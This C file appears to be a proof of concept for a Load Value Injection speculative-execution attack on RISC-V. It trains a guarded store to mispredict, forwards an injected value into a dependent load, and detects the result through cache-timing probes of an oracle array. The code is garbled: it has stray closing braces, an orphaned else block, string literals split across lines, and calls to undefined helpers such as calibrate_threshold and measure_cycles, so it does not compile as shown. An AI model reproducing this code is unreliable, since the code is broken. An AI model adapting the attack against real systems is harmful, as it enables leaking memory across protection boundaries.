#include <stdio.h>
#include <stdint.h>
#include "encoding.h"
#include "cache.h"

#define SECRET_VAL 42    // A known value used in victim_memory for this example
#define ARRAY_SIZE 256   // Size of arrays

// Oracle array used for the side channel.
// Each entry is separated by 4096 bytes (likely page size) to minimize cache set collisions.
volatile uint8_t oracle[ARRAY_SIZE * 4096];
volatile uint8_t lvi_guard = 1;
volatile uint8_t injected_value = 0;

// "Victim" memory from which a value might be read speculatively.
volatile uint8_t victim_memory[ARRAY_SIZE];

// "Marker" characters used to signal which speculative path was taken via the oracle array.
static inline void touch_oracle_idx(int idx){ volatile uint8_t *p = &oracle[idx*4096]; volatile uint8_t v = *p; (void)v; }
#define MARKER_ZERO    'a' // Corresponds to oracle index (ARRAY_SIZE - 1)
#define MARKER_NONZERO 'z' // Corresponds to oracle index 0

/**
 * @brief Attempts to flush the oracle array from the cache.
 * This increases the contrast for detecting cache hits later.
 * Uses a dummy array access pattern as a simple eviction strategy.
 */
void flushOracle(){
    flushCache((uint64_t)oracle, sizeof(oracle));
}
}

/**
 * @brief Measures the access time to a given memory address using the RISC-V cycle counter.
 * @param addr The address to measure access time for.
 * @return The number of cycles taken for the access.
 */
uint64_t measureAccessTime(volatile uint8_t *addr) {
    uint64_t time1, time2;
    time1 = rdcycle();          // Read cycle counter before access
    volatile uint8_t value = *addr; // Perform the memory access
    time2 = rdcycle() - time1;  // Read cycle counter after access and calculate difference
    (void)value; // Prevent unused variable warning
    return time2;
}

/**
 * @brief Checks if accessing the oracle entry corresponding to a marker character is fast (cached).
 * @param c The marker character ('a' or 'z').
 * @return 1 if access time suggests a cache hit, 0 otherwise.
 */
uint8_t isCachedChar(char c) {
    int index;
    if (c == MARKER_NONZERO) { // 'z'
        index = 0; // Oracle position for MARKER_NONZERO ('z')
    } else { // MARKER_ZERO ('a')
        index = ARRAY_SIZE - 1; // Oracle position for MARKER_ZERO ('a')
    }
    // Measure access time to the specific oracle entry
    uint64_t time = measureAccessTime(&oracle[index * 4096]);
    // Assume cached if access time is below a threshold (e.g., 50 cycles)
    return (time < 50);
}

/**
 * @brief Simulates a victim function subject to speculative execution.
 * Demonstrates how a mispredicted bounds check might lead to speculative execution
 * that depends on a value potentially influenced by the attacker or prior state.
 * The speculative path taken leaks information via the oracle array cache state.
 * @param attacker_input An index provided by the attacker. Used for the bounds check.
 */
void victimFunctionSpeculativeInjection(uint8_t attacker_input){
    if (attacker_input < ARRAY_SIZE){
        // Mispredicted guarded store intended to be squashed but to forward injected_value
        if (lvi_guard){
            victim_memory[attacker_input] = injected_value; // executes speculatively during attack
        }
        // Dependent load which may receive forwarded injected_value
        uint8_t spec_val = victim_memory[attacker_input];
        // Encode spec_val into oracle cache state
        if (spec_val == 0){
            touch_oracle_idx(ARRAY_SIZE - 1);
        } else {
            touch_oracle_idx(0);
        }
    }
} else {
             // Path taken if spec_val is (or is speculated to be) non-zero.
             // Access oracle entry corresponding to MARKER_ZERO ('a')
             oracle[(ARRAY_SIZE - 1)*4096] = MARKER_ZERO; // Loads 'a' cache line
        }
        // --- End of speculative execution window ---
    }
}

int main(void){
    // Initialize victim memory to non-zero baseline
    for (int i=0;i<ARRAY_SIZE;i++){ victim_memory[i] = SECRET_VAL; }
    uint64_t thr = calibrate_threshold((uint8_t*)oracle);

    // Training: set guard = 1 so the store path is taken (predict taken)
    lvi_guard = 1; injected_value = 0; // train with zero to bias inner branch too
    printf("Training LVI gadget...
");
    for (int i=0;i<200;i++){
        flushOracle();
        victimFunctionSpeculativeInjection(i % ARRAY_SIZE);
    }

    // Attack: flip guard to 0 so store is architecturally not taken; predictor will likely mispredict as taken
    // Choose a target index; set injected_value to a non-zero marker
    uint8_t target_idx = 7; injected_value = 0x5A; lvi_guard = 0;
    printf("Triggering LVI...
");
    flushOracle();
    victimFunctionSpeculativeInjection(target_idx);

    // Probe oracle
    uint64_t t0 = measure_cycles(&oracle[0*4096]);
    uint64_t t1 = measure_cycles(&oracle[(ARRAY_SIZE-1)*4096]);
    printf("Oracle timing: idx0=%lu idxN=%lu (thr=%lu)
", (unsigned long)t0, (unsigned long)t1, (unsigned long)thr);
    if (t0 < thr) printf("Likely leaked: non-zero (injected) path.
");
    else if (t1 < thr) printf("Likely leaked: zero path.
");
    else printf("No clear leak detected.
");
    return 0;
}
